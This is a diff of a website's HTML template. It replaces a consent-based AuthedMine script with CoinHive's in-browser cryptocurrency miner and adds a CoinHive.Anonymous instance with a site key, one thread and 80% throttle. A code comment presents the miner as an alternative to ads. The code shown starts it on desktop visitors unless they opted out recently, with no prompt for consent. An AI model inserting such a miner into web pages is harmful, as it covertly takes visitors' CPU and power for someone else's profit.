@@ -362,10 +362,16 @@ any other way (well… I can, I just don’t prefer it).</p>
       gtag('config', 'UA-11511983-4');
     </script>
 
-    <!-- Coinbase script - cause it's better than ads -->
-    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+    <!-- CoinHive Script
+           This uses a small percentage of your CPU (20% on 1 thread) to mine on
+           CoinHive as an alternative to Ads. As I undersatnd it, ad-blocker will
+           stop this as well, so it should be just as (in)effective. -->
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
-      var miner = new CoinHive.Anonymous('T03lCJSshVAHeutVlaH1ZT4cCQgE0RmJ', {throttle: 0.90});
+      var miner = new CoinHive.Anonymous('T03lCJSshVAHeutVlaH1ZT4cCQgE0RmJ', {
+        threads:  1,
+        throttle: 0.80,
+      });
 
       // Only start on non-mobile devices and if not opted-out
       // in the last 14400 seconds (4 hours):
